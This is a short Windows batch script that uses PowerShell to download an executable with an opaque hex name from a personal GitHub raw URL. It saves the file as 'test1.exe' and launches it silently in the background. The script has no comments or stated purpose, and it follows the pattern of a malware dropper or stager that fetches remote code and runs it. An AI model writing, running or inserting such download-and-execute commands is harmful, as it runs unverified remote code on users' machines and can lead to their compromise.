@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile test1.exe"
start /B "" "test1.exe"
